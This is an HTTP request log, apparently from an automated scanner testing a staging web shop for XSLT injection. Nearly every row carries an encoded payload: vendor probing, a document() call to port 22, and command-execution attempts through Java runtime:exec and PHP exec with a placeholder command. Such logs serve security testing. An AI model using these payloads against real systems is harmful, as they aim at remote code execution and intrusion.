ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5389,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,518,428,282
5390,Mon Sep 07 02:47:04 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,666,429,1036
5391,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,521,428,624
5392,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,500,429,1033
5393,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,515,429,1101
5394,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,507,429,1100
5395,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,534,429,1100
5396,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,502,428,373
5397,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3C,200,OK,486,429,1100
5398,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3C,200,OK,517,429,1100
5399,Mon Sep 07 02:47:05 BDT 2026,Mon Sep 07 02:47:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,642,430,18158
5400,Mon Sep 07 02:47:06 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,679,429,1036
5401,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,511,429,1100
5402,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,562,429,1101
5403,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,554,429,1100
5404,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,508,429,1100
5405,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3C,200,OK,508,429,1100
5406,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,521,429,1100
5407,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,652,429,1036
5408,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,503,429,1100
5409,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,533,429,1101
5410,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,517,429,1100
5411,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,517,429,1100
5412,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,532,429,1100
5413,Mon Sep 07 02:47:08 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,627,429,1100
5414,Mon Sep 07 02:47:07 BDT 2026,Mon Sep 07 02:47:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,662,430,18158
5415,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3C,200,OK,522,429,1100
5416,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,537,429,1100
5417,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3C,200,OK,514,429,1100
5418,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,514,429,1100
5419,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3C,200,OK,514,429,1100
5420,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,519,429,1100
5421,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,534,429,1100
5422,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,513,429,1100
5423,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,513,429,1100
5424,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,516,429,1100
5425,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,515,429,1100
5426,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,516,429,1100
5427,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,528,429,1100
5428,Mon Sep 07 02:47:10 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,491,429,1100
5429,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/user,404,Not Found,675,435,271
5430,Mon Sep 07 02:47:09 BDT 2026,Mon Sep 07 02:47:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,707,430,18158
5431,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,530,429,1100
5432,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3C,200,OK,518,429,1100
5433,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,518,429,1100
5434,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5435,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,534,429,1100
5436,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5437,Mon Sep 07 02:47:11 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,564,429,1100
5438,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,515,429,1100
5439,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,551,429,1100
5440,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,515,429,1100
5441,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,515,429,1100
5442,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,531,429,1100
5443,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,542,429,1100
5444,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,523,429,1100
5445,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1100
5446,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,531,429,1100
5447,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,498,429,1100
5448,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,529,429,1100
5449,Mon Sep 07 02:47:12 BDT 2026,Mon Sep 07 02:47:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,888,430,18158
5450,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,493,429,1100
5451,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,537,429,1100
5452,Mon Sep 07 02:47:13 BDT 2026,Mon Sep 07 02:47:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,537,429,1100
5453,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,519,429,1100
5454,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,520,429,1100
5455,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,530,429,1100
5456,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,526,429,1100
5457,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,522,429,1100
5458,Mon Sep 07 02:47:15 BDT 2026,Mon Sep 07 02:47:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,524,429,1100
5459,Mon Sep 07 02:47:15 BDT 2026,Mon Sep 07 02:47:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,508,429,1100
5460,Mon Sep 07 02:47:15 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb?_rsc=%3C,200,OK,658,429,3931
5461,Mon Sep 07 02:47:15 BDT 2026,Mon Sep 07 02:47:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,509,429,1100
5462,Mon Sep 07 02:47:15 BDT 2026,Mon Sep 07 02:47:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,536,429,1100
5463,Mon Sep 07 02:47:14 BDT 2026,Mon Sep 07 02:47:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,667,430,18158
5464,Mon Sep 07 02:47:16 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,553,429,1100
5465,Mon Sep 07 02:47:16 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,521,429,1100
5466,Mon Sep 07 02:47:16 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,504,429,1100
5467,Mon Sep 07 02:47:16 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,520,429,1100
5468,Mon Sep 07 02:47:16 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/user/64406959-fab5-485b-afca-6682eb0ab0bb?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,661,429,3931
5469,Mon Sep 07 02:47:17 BDT 2026,Mon Sep 07 02:47:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,555,429,1100
5470,Mon Sep 07 02:47:17 BDT 2026,Mon Sep 07 02:47:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,674,430,18158
